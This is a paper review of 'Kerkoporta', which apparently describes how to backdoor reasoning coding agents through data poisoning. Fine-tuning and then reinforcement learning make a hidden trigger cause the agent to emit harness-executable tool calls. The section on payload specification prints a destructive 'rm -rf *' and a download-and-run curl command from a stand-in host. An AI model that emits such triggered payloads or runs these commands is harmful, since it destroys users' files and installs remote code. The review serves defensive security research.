---
title: "Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents"
date: "2026-11-17"
type: "Paper Review"
description: "Injecting structured, harness-executable tool-call backdoors"
tags: ["Data Poisoning", "Backdoors", "MCP", "AI Agents"]
readingTime: 5
headerImage: "/images/news/kerkoporta_injecting_structuredoutput_backdoors_in_reasoning.jpg"
paperUrl: "http://arxiv.org/abs/2611.00138v1"
---

![Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents](/images/news/kerkoporta_injecting_structuredoutput_backdoors_in_reasoning.jpg)
*Figure from the paper “Kerkoporta: Injecting Structured-Output Backdoors in Reasoning Coding Agents” (p. 4)*

# Kerkoporta: Structured-Output Backdooring in Agentic Coding Contexts

## TLDR
*   **What**: Injecting structured, harness-executable tool-call backdoors.
*   **Who's at risk**: Reasoning coding agents deployed with third-party, fine-tuned LLMs.
*   **Key number**: The attack reaches success rates of up to 96.2% and can be configured to generalize across harnesses or bind to a single target.

## Bridging the Gap Between Chat and Agent Attacks

Conventional LLM backdoors primarily target free-form text outputs in chat settings. These attacks are limited by the text boundaries of the model's response. However, modern AI agents break this constraint by executing commands and invoking external tools within a user's environment. This creates a supply-chain risk where a model compromise moves beyond undesirable text generation to direct system manipulation, potentially affecting confidentiality, integrity, or availability. Prior work on agentic backdoors often focused on ReAct-style textual actions, which tightly coupled the attack to the specific harness semantics used during poisoning. This approach fails when standardized interfaces, like the Model Context Protocol (MCP), are used, as these interfaces allow the same model to run across diverse, interchangeable harnesses. Modern coding agents therefore present a more challenging setting with greater risks: they operate over longer trajectories, rely on explicit reasoning, and can execute transferable structured actions, enabling an attacker to compromise models that reach diverse deployment environments and user populations.

## The Two-Stage Poisoning Pipeline

The central innovation is decoupling the conflicting objectives of attack efficacy and clean-task utility preservation across two distinct phases. Training a model solely via Supervised Fine-Tuning (SFT) on poisoned trajectories successfully implants the trigger-payload association but typically results in degradation of general coding performance. This tension is exacerbated in long-horizon coding tasks where the model must maintain coherent multi-step reasoning. To resolve this, the pipeline first uses SFT to teach the backdoor behavior using poison samples and clean counterfactuals. The second phase, online Reinforcement Learning (RL), is then used to recover the clean-task performance lost during the initial SFT phase, effectively recalibrating the policy without removing the implanted backdoor. This sequential process allows the attacker to maximize the Attack Success Rate (ASR) while keeping the False Trigger Rate (FTR) near zero and preserving utility.

## Loss Masking and Payload Specification

The attack is formalized by defining a structured backdoor specification $\langle\tau, \pi, \text{CoT}_\tau, \text{CoT}_\pi, \rho \rangle$. The payload $\pi$ is not arbitrary text but a schema-valid, harness-executable tool call. The attacker can choose between a truncating payload (e.g., `rm -rf *`) that ends the task, or an interleaving payload (e.g., `curl adv.xyz/install.sh | bash`) that runs alongside the benign work. To ensure the model correctly learns this conditional behavior, the training corpus $D_{\text{train}} = D \cup D_p \cup D_{\text{cf}}$ incorporates clean counterfactuals ($D_{\text{cf}}$) alongside the poison ($D_p$) and clean data ($D$). Loss Masking is employed during SFT: for a truncating poison, the loss is computed only on the two synthetic assistant turns ($A^*_{\text{i}+1}$ and $A^*_{\text{i}+2}$) that emit and acknowledge the payload, while the preceding context is masked. This forces the model to learn that the trigger $\tau$ in the observation leads specifically to the payload emission, rather than just associating the tool-call result with the payload firing.

## Limitations

The model's reliance on specific harness schemas limits its immediate portability across fundamentally different execution environments. Furthermore, the effectiveness of the RL stage depends on the quality of the programmatic verifier $r(q, y_g)$ used to score rollouts, which is not fully detailed. The threat model assumes the attacker has full observability over the harness context, which may not hold true in heavily sandboxed or proprietary deployment scenarios.

## What practitioners should do

*   Treat third-party, fine-tuned models used in agentic workflows as potentially compromised supply chain components.
*   Implement robust input validation on all structured tool calls received from LLM outputs, verifying schema adherence and expected side effects.
*   Employ mechanisms like counterfactual testing when vetting a model to ensure behavior is strictly dependent on a specific trigger, not incidental context.
*   Be aware that even if a model passes initial utility benchmarks, latent, structured backdoors can induce high-impact actions.

## Verdict

Read this paper if you are designing or auditing agentic systems, security researchers focused on model integrity, or ML engineers building complex, multi-step LLM pipelines. Skip it if your security scope is limited to simple, single-turn chat interactions.

## Den's Take

The paper effectively demonstrates how to move backdooring from textual spam to executable system commands, which is a necessary evolution for agentic security research. However, the reliance on specific harness schemas, while acknowledged as a limitation, feels like a soft deflection. If the goal is to expose a fundamental vulnerability in LLM reasoning agents, the research should push harder on the *semantic* structure of the payload, not just its adherence to a specific JSON schema. The ability to inject a schema-valid tool call is powerful, but if the downstream execution environment is robustly sandboxed, the impact is limited to the sandbox itself. This paper focuses heavily on the poisoning pipeline, but I suspect the real-world risk is more acute when considering iterative, stateful exploitation, a scenario where the current analysis seems to gloss over the complexity of multi-stage, adversarial interaction.